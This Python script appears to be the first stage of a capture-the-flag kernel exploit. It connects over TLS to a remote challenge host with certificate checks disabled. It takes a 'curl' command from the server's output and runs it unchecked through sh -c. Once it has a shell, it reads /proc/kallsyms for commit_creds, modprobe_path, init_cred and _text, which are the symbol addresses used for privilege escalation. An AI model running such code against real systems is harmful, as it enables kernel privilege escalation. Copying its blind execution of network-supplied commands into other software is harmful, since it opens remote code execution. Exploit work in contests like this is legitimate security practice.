import subprocess, sys, time, socket, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection(('throughthewall.opus4-7.b01le.rs', 8443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname='throughthewall.opus4-7.b01le.rs')

def recv_until(pat, timeout=30):
    data = b''
    ssock.settimeout(timeout)
    while pat not in data:
        try:
            c = ssock.recv(4096)
            if not c: break
            data += c
        except socket.timeout: break
    return data

def sendline(s): ssock.sendall((s + '\n').encode())

initial = recv_until(b'solution:')
text = initial.decode(errors='replace')
for line in text.split('\n'):
    l = line.strip()
    if l.startswith('curl'): challenge = l; break
result = subprocess.run(['sh', '-c', challenge], capture_output=True, text=True, timeout=120)
sendline(result.stdout.strip())
recv_until(b'$ ', timeout=120)
print('[+] Got shell', flush=True)

sendline('grep " T _text" /proc/kallsyms')
data = recv_until(b'$ ', timeout=5)
print('_text:', data.decode(errors='replace').strip(), flush=True)

sendline('grep commit_creds /proc/kallsyms')
data = recv_until(b'$ ', timeout=5)
print('commit_creds:', data.decode(errors='replace').strip(), flush=True)

sendline('grep modprobe_path /proc/kallsyms')
data = recv_until(b'$ ', timeout=5)
print('modprobe_path:', data.decode(errors='replace').strip(), flush=True)

sendline('grep init_cred /proc/kallsyms')
data = recv_until(b'$ ', timeout=5)
print('init_cred:', data.decode(errors='replace').strip(), flush=True)

ssock.close()
